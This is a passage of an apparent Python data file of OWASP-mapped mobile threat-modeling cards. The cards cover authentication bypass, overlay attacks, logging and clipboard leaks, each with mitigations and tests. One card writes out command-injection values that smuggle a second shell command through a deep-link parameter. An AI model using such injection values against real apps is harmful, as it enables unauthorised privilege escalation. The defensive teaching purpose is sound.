- Validate date/time sensitive tokens against server time, not device time; reject tokens with excessive clock skew.
- Apply least-privilege: grant only the capabilities appropriate to the authentication level achieved so far, not the final level.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Server-Side**
- Implement a server-side session state machine for multi-step flows: each API endpoint checks the session state before processing, not just the step parameter.
- Return step-completion tokens (short-lived JWTs or opaque tokens) that the next step must present; the server validates the token, not a client-supplied flag.
- Use server-authoritative timestamps for all token expiry; reject tokens where `iat` or `exp` differs from server time by more than an acceptable skew (e.g., 5 minutes).

**Android**
- Do not store multi-step flow progress in `SharedPreferences` or `Intent` extras; store it only in server-side session state.
- Verify that the app does not allow deep-linking directly into the middle of an authentication flow without a server-verified step token.

**iOS**
- Avoid `UserDefaults` for any value that represents authentication state; it is not protected and can be modified on jailbroken devices.
- Validate all completion tokens server-side via a signed challenge-response, not by checking a local boolean.

**Testing**
- Replay step N+1's network request directly after completing step 1, skipping all intermediate steps; verify the server rejects it.
- Set the device clock 24 hours in the past and attempt to use an expired token; verify the server rejects it.
- Intercept the multi-step flow with a proxy (Burp Suite / mitmproxy) and tamper with step-tracking parameters.

**OWASP Mappings**
- MASVS: AUTH-1, AUTH-3
- MASTG: TEST-0034, TEST-0079
- MASWE: MASWE-0030
"""
}

CARDS["authentication-&-authorization/AA8"] = {
"explanation": """\
## Scenario: Pramod can intercept credentials through misdirection because the app is vulnerable to attacks like Tapjacking, StrandHogg, or URL scheme hijacking

Consider a scenario where Pramod has published a benign-looking utility app on an alternative app store. The utility app monitors for the launch of a popular banking app. When the banking app is about to display its login screen, Pramod's app uses a transparent overlay to capture the user's tap on the "Sign In" button — redirecting the touch to Pramod's own credential capture form, which looks identical to the real login screen. The user enters their credentials believing they are logging into the bank. They are not.

1. Tapjacking (Android): a malicious transparent overlay redirects touches from the intended target to the attacker's UI.
2. StrandHogg / StrandHogg 2.0 (Android): a malicious app places its activity on top of a legitimate app's task stack, presenting a fake UI at authentication time.
3. URL scheme hijacking (iOS / Android): a malicious app registers the same custom URL scheme as the legitimate app and intercepts OAuth redirect callbacks containing authorization codes.

### Example

Pramod's "Battery Optimizer" app requests `SYSTEM_ALERT_WINDOW` permission. Once granted, it monitors the foreground app and, when the banking app's login activity is detected, it draws a transparent view over the input fields with touch interception enabled. The user taps what they believe is the bank's login button. The tap is captured by Pramod's overlay. The credentials are forwarded to Pramod's server and then relayed to the real bank — so the login succeeds and the user suspects nothing. Pramod now has the credentials. The "Battery Optimizer" was not optimising batteries.

## Threat Modeling

### STRIDE

This scenario falls under **Spoofing**.

Pramod's app deceives the user into believing they are interacting with the legitimate banking app, capturing credentials they intended only for the legitimate service.

### What can go wrong?

- User credentials are captured by a malicious overlay and used for account takeover.
- OAuth authorization codes are intercepted via URL scheme hijacking and used to obtain access tokens.
- The user has no indication the attack is occurring; the legitimate app may even complete the login after the credentials are forwarded.

### What are we going to do about it?

- Set `filterTouchesWhenObscured = true` on sensitive views to prevent touch events when another view is drawing over them.
- Use `FLAG_SECURE` on activities that handle authentication to prevent overlays from capturing the screen.
- Replace custom URL schemes for OAuth with App Links (Android) or Universal Links (iOS) — these are domain-verified and cannot be registered by arbitrary apps.
- Verify the task affinity and caller package for activities that handle authentication, and reject unexpected callers.
- Implement anti-StrandHogg measures: set `taskAffinity=""` and `allowTaskReparenting="false"` on authentication activities.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android — Tapjacking**
- On sensitive views: `view.setFilterTouchesWhenObscured(true)` or `android:filterTouchesWhenObscured="true"` in XML.
- Set `FLAG_SECURE` on authentication Activities to prevent screen captures and reduce overlay utility.
- On Android 12+, the `HIDE_OVERLAY_WINDOWS` permission allows apps to request that `SYSTEM_ALERT_WINDOW` overlays are not shown over them; request it if your threat model warrants it.

**Android — StrandHogg**
- Set `android:taskAffinity=""` on Activities that handle authentication to prevent task reparenting.
- Set `android:allowTaskReparenting="false"` on the main activity.
- StrandHogg 2.0 (CVE-2020-0096) was patched in Android 11; set `minSdkVersion >= 30` or document the risk.

**Android/iOS — URL Scheme Hijacking**
- Android: use App Links (`android:autoVerify="true"` with a verified domain association file) instead of custom schemes for OAuth redirects.
- iOS: use Universal Links instead of custom URL schemes for OAuth redirects; Universal Links require domain ownership verification.
- Validate the PKCE `code_verifier` server-side for all OAuth flows to make intercepted authorization codes unusable without the verifier.

**Testing**
- On Android, use `adb shell dumpsys window windows` during authentication to detect overlays.
- Register a second app with the same custom URL scheme and verify the OS or app rejects the hijack attempt.

**OWASP Mappings**
- MASVS: AUTH-1, CODE-1, CODE-4, PLATFORM-1, PLATFORM-3
- MASTG: TEST-0025, TEST-0030, TEST-0035, TEST-0072, TEST-0075
- MASWE: MASWE-0039, MASWE-0056, MASWE-0057
"""
}

CARDS["authentication-&-authorization/AA9"] = {
"explanation": """\
## Scenario: Wong can bypass the authentication because it does not fail securely — it defaults to allowing unauthenticated access

Consider a scenario where Wong discovers that if the biometric hardware returns an error (sensor unavailable, too many failed attempts, or a thrown exception from the biometric API), the app's authentication flow catches the exception and falls through to a code path that sets `authState = AUTHENTICATED`. The authentication fails open: an error is treated as success.

1. Exceptions from the biometric or authentication API are caught without a secure fallback, and execution continues as if authentication succeeded.
2. A boolean `authenticated` flag is initialized to `true` and only set to `false` on explicit failure — meaning any exception or early return leaves it `true`.
3. Network-dependent authentication: if the server is unreachable, the app allows offline access rather than denying it.

### Example

Wong triggers a temporary hardware sensor error (by covering the fingerprint sensor and submitting multiple deliberate failures). The app's `authenticate()` function throws `AuthenticationException`. The catch block logs the exception and calls `proceed()`, which was the next line in the original non-exception flow. The authentication state is never explicitly set to "failed." The app opens. Wong is now authenticated as the device owner without presenting any valid credential. The developer's intention was graceful degradation. The result was an open door.

## Threat Modeling

### STRIDE

This scenario falls under **Spoofing**.

Wong impersonates an authenticated user by exploiting a fail-open authentication implementation. Any condition — hardware error, network timeout, exception — that causes the authentication check to be skipped results in unauthorised access.

### What can go wrong?

- Authentication errors or exceptions result in unauthenticated access to sensitive data.
- Network-unreachable errors during remote authentication allow offline access that the policy intended to deny.
- Race conditions between authentication state transitions result in a briefly unauthenticated window.

### What are we going to do about it?

- Initialise all authentication state to "not authenticated" (fail-closed); only set it to "authenticated" on explicit, verifiable success.
- In all exception handlers and fallback paths, set authentication state to "failed" and navigate to the login screen.
- For cryptographic authentication: rely on the success of the cryptographic operation, not a boolean flag; if the decryption fails (e.g., key not unlocked), the data is not available — no flag manipulation can change this.
- For remote authentication: if the server is unreachable and online authentication is required by policy, deny access rather than fall back to an offline mode that was not explicitly designed and reviewed.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- `BiometricPrompt.AuthenticationCallback` has three callbacks: `onAuthenticationSucceeded`, `onAuthenticationError`, `onAuthenticationFailed`.
- Only `onAuthenticationSucceeded` should transition authentication state to "authenticated".
- In `onAuthenticationError` and `onAuthenticationFailed`, explicitly set state to "not authenticated" and show the login screen.
- Use crypto-based authentication: if `cipher.doFinal()` succeeds, the user is authenticated — if it throws, they are not. No boolean flag needed.

**iOS**
- `LAContext.evaluatePolicy` completion handler: only proceed on `success == true && error == nil`.
- If `error` is `LAError.biometryNotAvailable`, `biometryNotEnrolled`, or `biometryLockout`, navigate to an alternative authentication method — not to an authenticated state.
- For Secure Enclave key operations: `SecKeyCreateSignature` / `SecKeyDecrypt` failing means the key was not unlocked; treat failure as unauthenticated.

**Testing**
- Trigger biometric API errors (cover sensor, exhaust retry limit, revoke permissions) during authentication and verify the app reaches the login screen, not the authenticated state.
- Use Frida to throw exceptions from the biometric callback and observe the app's response.
- Disconnect from the network during remote authentication; verify the app denies access rather than allowing offline mode.

**OWASP Mappings**
- MASVS: AUTH-2
- MASTG: TEST-0017, TEST-0018, TEST-0064
- MASWE: (see MASVS references above)
"""
}

CARDS["authentication-&-authorization/AAX"] = {
"explanation": """\
## Scenario: Prasad can bypass the centralized authentication and authorization controls because they are not being used comprehensively on all interactions

Consider a scenario where Prasad finds the app has a centralized `AuthManager` class used on most screens — but not on a recently added "quick share" feature added by a new developer who was unfamiliar with the codebase. The quick-share feature accesses user data directly without calling `AuthManager.requireAuthentication()`. Prasad deep-links directly into the quick-share screen. He accesses the user's shared data without any authentication.

1. Centralized auth controls not applied to all code paths leave gaps that bypass all security.
2. New features added under time pressure may skip the standard auth gate.
3. API endpoints added to support a new feature may not be protected by the same middleware that protects existing endpoints.

### Example

Prasad reviews the app's deep-link manifest and finds `appscheme://quickshare?id=12345`. He opens the link and the quick-share screen appears with the user's full name, profile picture, and shared content — all without an authentication prompt. The `AuthManager` class is comprehensive and well-written. It is just not called from this particular activity. The gap is not in the control; it is in its coverage.

## Threat Modeling

### STRIDE

This scenario falls under **Spoofing** and **Elevation of Privilege**.

Inconsistent application of centralized auth controls means an attacker can find and exploit the gaps — gaining access equivalent to an authenticated user by navigating to an unprotected entry point.

### What can go wrong?

- Unprotected entry points (activities, API endpoints, deep links) expose data or functionality without authentication.
- The gap may not be immediately apparent in code review because the auth control exists and is used elsewhere.
- API endpoints for new mobile features added without the standard auth middleware pass all existing integration tests but fail in production when a malicious caller probes them directly.

### What are we going to do about it?

- Implement authentication as middleware that is applied globally by default; individual screens/endpoints must explicitly opt out (with documentation), not opt in.
- Use code review checklists and automated linting rules to flag any Activity, Fragment, or API handler that does not invoke the auth gate.
- Apply the same authentication and authorization controls to deep-linked entry points as to normal navigation paths.
- Conduct regular access-control audits across all entry points, including new features added since the last review.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Define a base `AuthenticatedActivity` or `BaseFragment` that calls `AuthManager.requireAuthentication()` in `onResume`; all screens that require authentication should extend this base class.
- Apply automated lint checks (e.g., custom lint rules) to flag Activities and Fragments that do not extend `AuthenticatedActivity`.
- Audit all `<activity>` deep-link intent filters in the manifest; verify each destination performs an authentication check.

**iOS**
- Use a root `AuthenticatedViewController` or a SwiftUI `View` modifier that enforces authentication on appearance; apply it uniformly.
- Audit the `SceneDelegate`/`AppDelegate` URL handler for every deep-link path to verify authentication is checked before the destination is loaded.
- Centralise navigation in a router that enforces authentication before resolving any route.

**Server-Side**
- Apply authentication middleware globally at the framework level; individual endpoints must opt out explicitly with auditor approval, not opt in silently.
- Scan API route definitions for missing middleware tags as part of CI.

**Testing**
- Enumerate all deep-link schemes and navigate to each without an active session; verify all prompt for authentication.
- Review every Activity, Fragment, and API endpoint for the presence of the auth gate call.

**OWASP Mappings**
- MASVS: AUTH-1, AUTH-2, CODE-3, CODE-4
- MASTG: TEST-0017, TEST-0064
- MASWE: MASWE-0032, MASWE-0033, MASWE-0038, MASWE-0042
"""
}

CARDS["authentication-&-authorization/AAJ"] = {
"explanation": """\
## Scenario: Ade can bypass authentication because it is not enforced using a remote endpoint, or it is not based on a cryptographic primitive protected by keystore/keychain access control flags

Consider a scenario where Ade installs a modified version of the target app on a rooted device. The app performs biometric authentication locally and stores a boolean `loggedIn = true` in `SharedPreferences`. There is no server-side session; the app directly accesses a local database. Ade modifies `SharedPreferences` using a root file manager, sets `loggedIn = true`, and opens the app. The database is decrypted with a key that is not bound to any authentication event. Ade accesses all stored user data. No network request was ever made. The server never knew Ade existed.

1. Authentication enforced only locally can be bypassed on rooted or jailbroken devices by modifying local state.
2. Cryptographic keys not bound to authentication events can be used by any process with the right storage access, bypassing the intent of the authentication gate.
3. Purely offline apps that do not validate session state with a server have no authoritative trust anchor.

### Example

Ade examines the app's APK and finds it stores the authentication state in `SharedPreferences` and uses a symmetric encryption key in the keystore that has `setUserAuthenticationRequired(false)`. On a rooted device, Ade modifies the `SharedPreferences` XML file to set the authentication flag to `true`. The app reads the flag, skips the biometric prompt, and decrypts the database — because the key was never protected by authentication requirements. The biometric prompt was a visual gate with no cryptographic fence behind it.

## Threat Modeling

### STRIDE

This scenario falls under **Spoofing** and **Elevation of Privilege**.

By bypassing local-only authentication, Ade gains the ability to act as a legitimately authenticated user, accessing data and functionality that should require verified identity.

### What can go wrong?

- Local state manipulation on rooted devices bypasses all local-only authentication checks.
- Unbound cryptographic keys are accessible to any process with storage access, making them equivalent to no encryption.
- Without server-side session validation, there is no way to revoke access remotely.

### What are we going to do about it?

- Enforce authentication using a remote endpoint for all operations involving sensitive data: the server must issue a short-lived session token only after verifying the authentication factor.
- Bind local cryptographic keys to user authentication events: `setUserAuthenticationRequired(true)` (Android) and Secure Enclave with biometric access control (iOS).
- Use the hardware-backed keystore (StrongBox on Android; Secure Enclave on iOS) for authentication-critical keys.
- Store session state server-side; the app holds only a short-lived token, not a long-lived `isLoggedIn` flag.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- `KeyGenParameterSpec.Builder.setUserAuthenticationRequired(true)` — key cannot be used without a recent user-authentication event.
- `setIsStrongBoxBacked(true)` — key stored in hardware-isolated StrongBox (where available); not extractable even with root.
- Do not store authentication state in `SharedPreferences` or any world-readable location; derive state from the ability to perform a key operation.

**iOS**
- Use the Secure Enclave: `kSecAttrTokenIDSecureEnclave` in `SecKeyCreateRandomKey` attributes; the private key never leaves the Secure Enclave.
- `kSecAccessControlBiometryCurrentSet` — key requires current biometrics; new enrolment invalidates.
- Do not store `isLoggedIn` in `UserDefaults`; treat authentication as the ability to perform a Secure Enclave operation successfully.

**Remote Session Validation**
- Issue short-lived access tokens (JWT exp ≤ 15 minutes) with refresh tokens stored securely.
- Require the client to present a valid access token on every API call; do not implement "trust the local flag" mode.
- Provide a server-side token revocation endpoint for stolen-device scenarios.

**Testing**
- On a rooted device, modify `SharedPreferences`/`UserDefaults` authentication flags and verify the app does not proceed without a valid server token.
- Attempt to use the local cryptographic key from a different app process on a rooted device; verify access is denied.

**OWASP Mappings**
- MASVS: AUTH-1, AUTH-2, CODE-3, STORAGE-1
- MASTG: TEST-0017, TEST-0018, TEST-0064
- MASWE: MASWE-0005, MASWE-0032, MASWE-0033, MASWE-0035, MASWE-0041
"""
}

CARDS["authentication-&-authorization/AAQ"] = {
"explanation": """\
## Scenario: Riotaro can inject and run a command that the application will run at a higher privilege level without being authenticated or authorized to do so

Consider a scenario where Riotaro discovers the app's "run diagnostic" deep link handler constructs a shell command by concatenating a user-supplied device ID parameter and passes it to `Runtime.exec()`. Riotaro sends `device_id=abc; am broadcast -a com.target.app.PRIVILEGED_ACTION`. The app executes the full concatenated string. The broadcast triggers a privileged internal action — without Riotaro being authenticated.

1. Command injection via IPC inputs: unvalidated parameters are incorporated into OS commands or privileged function calls.
2. An unauthenticated IPC entry point that invokes a privileged function effectively grants any caller the app's privilege level.

### Example

Riotaro finds `appscheme://diagnostic?cmd=network`. The app calls `Runtime.exec("diagnose_network")` with the parameter appended. He sends `cmd=network%3Bam+start+com.target.app/.AdminActivity`. The semicolon splits the command; the second command launches the admin activity without authentication. The diagnostic feature was only intended for internal QA. It shipped in the production APK.

## Threat Modeling

### STRIDE

This scenario falls under **Elevation of Privilege**.

Riotaro executes commands at the privilege level of the application process without satisfying any authentication or authorization requirement — the textbook definition of privilege escalation.

### What can go wrong?

- Arbitrary commands are executed in the app's process context.
- Privileged internal activities, services, or broadcasts are invoked without authentication.
- In extreme cases (root or setuid binaries involved), OS-level privilege escalation may be possible.

### What are we going to do about it?

- Never construct OS commands or privileged function calls from user-supplied or IPC-supplied input; use allowlists for any dynamic command parameters.
- Remove debug and diagnostic endpoints from production builds; use build variants to exclude them.
- Apply authentication and authorization checks at the entry point of every IPC handler, even for "internal" features.
- Replace `Runtime.exec()` with typed, parameterized APIs wherever possible to eliminate injection surfaces.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Audit all `Runtime.exec()`, `ProcessBuilder`, and `Runtime.getRuntime().exec()` calls for user-supplied input.
- Replace string-concatenated commands with typed API calls where possible (e.g., use `PackageManager` instead of `pm list packages` via exec).
- Remove diagnostic activities, services, and broadcast receivers from production manifests using product flavors: `debugImplementation` / `releaseImplementation`.

**iOS**
- Avoid `system()`, `popen()`, and `NSTask`/`Process` with untrusted input.
- Deep-link handlers: validate all URL parameters against a strict allowlist before using them in any function call.
- Remove debug URL schemes from the production `Info.plist`.

**Testing**
- Enumerate all deep-link schemes and inject shell metacharacters (`; & | $()`) into every parameter; observe for unexpected process spawning.
- Review production APK/IPA manifests for diagnostic or debug entry points that were not removed.
- Static analysis: grep for `Runtime.exec`, `ProcessBuilder`, `system(`, `popen` with variable arguments.

**OWASP Mappings**
- MASVS: AUTH-1
- MASTG: TEST-0025, TEST-0033, TEST-0078
- MASWE: (see MASVS references above)
"""
}

CARDS["authentication-&-authorization/AAK"] = {
"explanation": """\
## Scenario: Aatif can influence or alter authentication controls and can therefore bypass them

Consider a scenario where Aatif has identified that the app's authentication module loads its configuration (session timeout, required factors, biometric policy) from a local `auth_config.json` file that is not integrity-protected. On a rooted device, Aatif modifies `auth_config.json` to set `require_biometric: false` and `session_timeout: 99999`. The app reads the modified config at startup and applies the relaxed policy. Aatif authenticates with only a PIN, which he knows, and maintains the session indefinitely.

1. Authentication configuration stored locally without integrity protection can be modified by an attacker with device access.
2. Authentication logic that can be influenced by runtime hooks (Frida, Xposed) can have its behaviour altered without modifying the binary.
3. A/B testing or feature-flag systems that control security-relevant authentication requirements can be manipulated if the flag values are attacker-controllable.

### Example

Aatif discovers the app uses a remote feature-flag service and that the flags are cached locally without signing. He intercepts the flag update request with a MITM proxy and substitutes a response that disables multi-factor authentication. The app caches the manipulated flags. On the next launch, MFA is not required. The feature-flag system was designed to roll out UI changes safely. Nobody considered that it also controlled authentication requirements.

## Threat Modeling

### STRIDE

This scenario falls under **Tampering** and **Spoofing**.

Aatif modifies the authentication controls to reduce their effectiveness, then uses the weakened controls to authenticate without satisfying the intended security requirements.

### What can go wrong?

- Authentication policy weakened below the security baseline; requirements that should be mandatory become optional.
- Cryptographic controls that implement authentication are bypassed through runtime hook injection.
- Feature flags that control security requirements are manipulated, silently downgrading security for affected users.

### What are we going to do about it?

- Treat security-relevant configuration as code, not as mutable runtime data: hard-code the minimum security requirements and do not allow local configuration to weaken them.
- Integrity-protect and authenticate any remotely fetched security configuration; verify the digital signature before applying it.
- Implement runtime integrity checks to detect active hooking frameworks.
- Never allow feature flags or A/B tests to disable mandatory authentication factors below the documented security baseline.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Do not store authentication policy in externally modifiable files; hard-code the minimum policy in the app's source.
- If remote configuration is used for security parameters, sign the configuration server-side and verify the signature on the client before applying.
- Detect runtime hook frameworks: check for Frida/Xposed indicators in `/proc/self/maps`, loaded shared libraries, and method replacement indicators.

**iOS**
- Minimum authentication requirements (biometric required, session timeout) should not be overridable from `UserDefaults` or a local plist.
- Remote config (Firebase Remote Config, etc.) for security parameters: verify the payload signature before use; treat an unsigned or invalid payload as "use the hardcoded default."
- Detect jailbreak and hooking indicators; escalate to remote re-authentication rather than weakening security.

**Testing**
- On a rooted device, modify any local configuration files related to authentication and verify the app does not apply the modified policy.
- Use a proxy to modify remote configuration responses; verify the app rejects unsigned or modified payloads.
- Use Frida to hook authentication decision functions and attempt to return `true`; verify the cryptographic control still prevents access.

**OWASP Mappings**
- MASVS: AUTH-2
- MASTG: TEST-0017, TEST-0018, TEST-0064
- MASWE: (see MASVS references above)
"""
}

CARDS["authentication-&-authorization/AAA"] = {
"explanation": """\
## Ace: You have invented a new attack against "Authentication & Authorization"

This card is an invitation to go beyond the documented attack catalogue. Authentication and authorization are among the most actively researched areas of mobile security, and new bypass techniques emerge with each OS release, new hardware feature, and novel application pattern.

### What does this card ask you to do?

Invent a realistic new threat in the Authentication & Authorization domain that is not already represented by AA2 through AAK. Consider:

- **New biometric APIs:** Passive biometric authentication (face unlock during use, behavioural biometrics) — what trust assumptions does the app make about continuous authentication, and are they valid?
- **Cross-device authentication:** The app allows a paired wearable to authenticate the phone — what happens if the wearable is compromised or borrowed?
- **Delegated authentication:** The app accepts tokens from a third-party identity provider — are the token validation rules (audience, issuer, algorithm) implemented correctly on both client and server?
- **Federated logout:** A user logs out of the identity provider — does the app's session end, or does it continue with a locally cached token?
- **Push-notification authentication:** An OTP or approval notification is sent to the device — what if the device has been registered by an attacker who socially engineered the user?

### How to play this card

1. **Nominate a threat:** One player (or the group) proposes a specific, plausible authentication or authorization bypass not covered by other AA cards.
2. **Name the attacker and victim:** Who has what capabilities? What do they want?
3. **Classify the threat (STRIDE):** Most auth attacks are Spoofing or Elevation of Privilege.
4. **Assess likelihood and impact:** Is this realistic for your app's threat model?
5. **Propose a mitigation:** What design, code, or configuration change reduces the risk?
6. **Score the card:** A well-formed novel threat earns full points.

### Example starting prompts

- "What if an attacker registers their device with the push-notification authentication service before the real user, and the real user never checks which devices are registered?"
- "Our app trusts the OS-level 'user is authenticated' signal from Android Work Profile. What if the work profile authentication policy is weaker than our app requires?"
- "We allow login via a social provider. What if the social provider issues tokens with an algorithm we accept but that is weaker than we think (e.g., 'none' algorithm accepted)?"

## Threat Modeling

### STRIDE

Varies by the invented attack. Document the STRIDE classification as part of play.

### What can go wrong?

Authentication and authorization vulnerabilities allow attackers to impersonate users and access data or functionality they are not entitled to. Novel attack paths often arise from the intersection of new platform features and application assumptions that were valid when the app was written but are no longer valid.

### What are we going to do about it?

- Validate the invented threat against the current OWASP MASTG and MASVS.
- Document the threat and the agreed mitigation in the team's threat model register.
- If the threat is genuinely novel, consider contributing it to the OWASP MASVS/MASTG project.
""",
"technical_note": """\
## Guidance for Novel Authentication & Authorization Threats

**Common areas for novel attacks**
- New OS authentication APIs introduced in recent versions (e.g., Android Credential Manager, iOS Passkeys / FIDO2).
- Cross-device trust (wearable → phone authentication, Handoff/Continuity on iOS).
- JWT / OAuth 2.0 implementation errors: algorithm confusion, missing audience/issuer validation, non-revocable refresh tokens.
- Behavioural biometrics: passive authentication — is the trust model clearly defined and implemented?

**Framing the attack**
- What attacker capability is required?
- What is the authentication bypass chain?
- Can you write a proof-of-concept?

**Mapping to standards**
- MASVS: AUTH-1, AUTH-2, or AUTH-3 depending on the attack
- MASTG: consult the MASTG test catalogue for the closest existing test
- MASWE: check for an existing weakness entry; propose one if none exists

**OWASP Mappings**
- MASVS: determined by the invented threat
- MASTG: determined by the invented threat
- MASWE: determined by the invented threat

Do not fabricate references.
"""
}


# ─────────────────────────────────────────────────────────
# NETWORK & STORAGE (NS)
# ─────────────────────────────────────────────────────────

CARDS["network-&-storage/NS2"] = {
"explanation": """\
## Scenario: Matt can inspect sensitive application log data because logging statements have not been removed or reviewed as safe before the production release

Consider a scenario where Matt is a security researcher who installs a popular expense-tracker app and immediately runs `adb logcat` while using the app. Within three minutes of logging in, he sees the full session token printed to Logcat by a debug log statement, three database query results including account numbers, and the user's full name and email address. The developer logs were added during development and never removed. Matt did not need to exploit anything. The app gave him the data one log line at a time.

1. Debug log statements that print tokens, credentials, or sensitive data left in production releases are readable by any app with `READ_LOGS` permission, or by anyone with ADB access.
2. Crash reports and analytics SDKs may collect log data and transmit it to third parties.
3. On iOS, `NSLog` output is accessible on non-jailbroken devices via Xcode console when connected to a Mac, and on jailbroken devices via syslog.

### Example

Matt attaches `adb logcat -s MyApp:V` to the device. He logs into the expense tracker. The log shows:
```
D/AuthManager: Token: eyJhbGc...
D/DatabaseHelper: Query result: {name: "Matt", email: "matt@example.com", balance: 12345.67}
```
Matt now has a valid session token and knows more about "Matt's" finances than "Matt" would prefer. The log statements were left in from a debugging session the previous quarter. "It works in debug mode" is not a security argument.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure**.

Sensitive data is written to a system log that is accessible to other apps (with appropriate permissions), ADB-connected machines, crash reporting services, or anyone with physical access to a debug-connected device.

### What can go wrong?

- Session tokens logged in plaintext can be captured and replayed.
- PII (names, emails, account numbers) in logs violates data-protection regulations.
- Third-party crash-reporting SDKs that collect log context may exfiltrate sensitive data.
- On Android, apps with `READ_LOGS` permission can read the system log; pre-Android 4.1, any app could.

### What are we going to do about it?

- Remove all `Log.d`, `Log.v`, `System.out.println`, and equivalent statements that output sensitive data before production release.
- Use a logging library (Timber, OSLog) configured to compile out verbose/debug output in release builds.
- Never log: credentials, session tokens, full PII, payment details, health data, or encryption keys — in any build variant.
- Audit third-party SDK logging configurations; some SDKs have their own log levels that must be disabled separately.
- Include log-review in the pre-release security checklist.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Use `BuildConfig.DEBUG` guards: `if (BuildConfig.DEBUG) Log.d(TAG, sensitiveData)` — release builds will not execute the log call.
- ProGuard/R8: add `-assumenosideeffects` rules to strip `Log.*` calls from release builds automatically.
- Use Timber: configure `Timber.plant(Timber.DebugTree())` only in debug builds.
- `adb logcat -s <TAG>:V` to verify no sensitive data appears during normal usage in a release build.

**iOS**
- `os_log` (Unified Logging): messages at `.debug` and `.info` levels are not included in log archives from non-debug devices; `.default`, `.error`, and `.fault` levels are persistent.
- Never log sensitive data at `.default` level or above; do not use `print()` or `NSLog()` for anything that might include tokens or PII.
- In release builds, sensitive parameters should be redacted in log messages: `os_log("User authenticated: %{private}s", username)` — the `{private}` annotation prevents the value appearing in non-developer logs.

**Testing**
- Run `adb logcat` while performing sensitive operations (login, payment, data view) in a release build; verify no sensitive data is logged.
- On iOS, capture a syslog trace from a connected device via Xcode → Devices → Console; review for sensitive data.
- Review crash reports in Crashlytics/Sentry for any breadcrumb or log entries containing PII or tokens.

**OWASP Mappings**
- MASVS: PRIVACY-1, STORAGE-2
- MASTG: TEST-0003, TEST-0053, TEST-0203, TEST-0231, TEST-0296, TEST-0297
- MASWE: MASWE-0001
"""
}

CARDS["network-&-storage/NS3"] = {
"explanation": """\
## Scenario: Bil can access sensitive data from the pasteboard/clipboard or keyboard cache because the pasteboard/clipboard is not timely cleared, disabled, or restricted for sensitive fields, or because the keyboard cache is not disabled

Consider a scenario where Bil borrows a phone after the owner has just copied their account password from a password manager to the banking app. The clipboard still contains the password. Bil opens a notes app, pastes, and has the password. He did not hack anything. He just pressed Ctrl+V.

1. Clipboard data persists after the app is closed and is readable by any app that accesses `ClipboardManager`.
2. Keyboard autocomplete caches text typed into input fields, including sensitive fields without the password flag set.
3. On iOS 16+, apps can read clipboard contents if the user has recently granted permission — but older iOS versions or certain MDM configurations may still allow passive reads.

### Example

Bil's colleague Anjali had copied her banking PIN from her password manager to the app's PIN entry field. The PIN was cached by the keyboard and appeared as an autocomplete suggestion in the browser's address bar when Anjali next used it — because the PIN field was not marked as a password type, so the keyboard treated it as learnable text. Bil was sitting next to her and noticed the suggestion. He remembered the digits. Later that evening, he tested them. They worked.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure**.

Sensitive data persists in the clipboard or keyboard cache, outside the app's control, where it can be accessed by other apps or observed by bystanders.

### What can go wrong?

- Passwords, PINs, OTPs, and account numbers copied to the clipboard remain accessible until cleared.
- Keyboard autocomplete caches sensitive text entered without the password flag, surfacing it in other apps.
- Malicious apps on the same device can read clipboard contents or autocomplete suggestions.
- On iOS, clipboard access notifications (iOS 16+) alert users but do not prevent reading.

### What are we going to do about it?

- Mark all sensitive input fields with the platform's secure-entry flag to prevent keyboard caching.
- After copying sensitive data to the clipboard, schedule a timed clear (e.g., 30 seconds): `ClipboardManager.clearPrimaryClip()` on Android; `UIPasteboard.general.string = nil` on iOS when the app backgrounds.
- Avoid requiring users to copy sensitive data to the clipboard; provide secure in-app mechanisms (e.g., autofill, secure copy-once).
- Restrict clipboard access: on iOS 14+, apps are notified when they read the general pasteboard from the background — this is a detection signal, not a full prevention.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- `EditText`: set `android:inputType="textPassword"` to disable keyboard suggestions for sensitive fields.
- Clear clipboard after sensitive copy:
  ```kotlin
  handler.postDelayed({
      (getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager).clearPrimaryClip()
  }, 30_000)
  ```
- On Android 13+, `ClipboardManager.clearPrimaryClip()` may only clear the calling app's clipboard data — verify behaviour on target SDK versions.
- On Android 12+, apps can no longer silently read the clipboard from background; this is a platform mitigation, not a substitute for clearing.

**iOS**
- `UITextField.isSecureTextEntry = true` — prevents keyboard learning for that field.
- Clear on background: in `applicationWillResignActive(_:)`, set `UIPasteboard.general.string = nil` if the app had written sensitive data to it.
- On iOS 16+, `UIPasteboard` allows expiration: `UIPasteboard.general.setObjects([sensitive], localOnly: false, expirationDate: Date().addingTimeInterval(30))`.
- Use named pasteboards (`UIPasteboard(name:create:)`) for sensitive data shared between your own apps; named pasteboards can be set `localOnly: true` and are not accessible to other apps.

**Testing**
- After entering sensitive data and closing the app, open a text editor and paste; verify the clipboard is empty or contains a non-sensitive placeholder.
- Type sensitive data into each field; switch to a browser; verify the keyboard does not suggest the sensitive value.
- Check the iOS clipboard notification banner (iOS 16+) to verify the app is reading and clearing the clipboard as expected.

**OWASP Mappings**
- MASVS: STORAGE-2
- MASTG: TEST-0006, TEST-0055, TEST-0073
- MASWE: (see MASVS references above)
"""
}

CARDS["network-&-storage/NS4"] = {
"explanation": """\
## Scenario: Ricardo can extract data stored by the app on a stolen or decommissioned device because it does not enforce device access security policies

Consider a scenario where Ricardo finds a second-hand Android phone at a market. The phone's previous owner had a financial app installed and never performed a factory reset. The phone has no PIN lock because the previous owner found it inconvenient. Ricardo connects the phone to his computer, uses ADB to extract the app's data directory (which requires no encryption because the device is not locked), and reads the stored transaction history, locally cached credentials, and account number. The app trusted that the device would be protected. The device was not.

1. If the device has no lock screen PIN, Android's file-based encryption key is derived from a default value, making it less protective.
2. Apps that do not enforce minimum device security requirements (screen lock, encryption, OS version) cannot rely on the device as a security boundary.
3. USB debugging left enabled in a supposedly end-user device allows direct data extraction via ADB.

### Example

